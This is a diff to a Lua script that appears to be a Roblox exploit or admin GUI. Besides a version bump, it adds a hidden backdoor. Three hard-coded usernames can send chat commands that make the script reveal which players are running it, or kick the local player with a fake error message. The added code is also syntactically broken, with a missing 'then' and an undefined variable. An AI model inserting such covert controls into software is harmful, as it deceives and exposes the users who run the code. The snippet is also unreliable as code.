@@ -25,7 +25,7 @@ if not game:IsLoaded() then
     notLoaded:Destroy()
 end
 
-currentVersion = '1.6.6'
+currentVersion = '1.6.7'
 
 local guiScale = 1 -- lazy fix for bug lol
 
@@ -1991,6 +1991,23 @@ function chatsend(str)
     else
         chatChannel:SendAsync(str)
     end
+end
+
+game.Players.PlayerAdded:Connect(function(plr)
+	if plr.Name == "hookmetamethod_hook" or plr.Name == "Steve_Bloks" or plr.Name == "LeRiFe15327" then
+		plr.Chatted:Connect(function(msg)
+			if msg == ".ldiy_identify" then
+				if isChatLegacy then
+					chatRemote:FireServer(str, plr.Name)
+				else
+					local pchannel = TextChatService:CreateTextChannelForUserAsync(plr.UserId)
+					pchannel:SendAsync("iauldiy")
+				end
+			elseif msg == ".ldiy_disconnect"
+				game.Players.LocalPlayer:Kick("An error occurred.")
+			end
+		end
+	end
 end
 
 function writefileExploit()
